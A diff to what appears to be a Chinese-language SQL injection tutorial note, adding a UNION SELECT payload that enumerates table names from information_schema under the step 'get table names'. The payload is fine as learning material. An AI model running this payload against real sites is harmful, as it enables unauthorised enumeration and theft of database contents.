@@ -30,8 +30,9 @@ database()           #数据库名
 @@version_compile_os #操作系统版本
 ```
 5.**获取表名**
-
-
+```
+UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+```
 6.**获取列名**
 
 7.**获取字段**
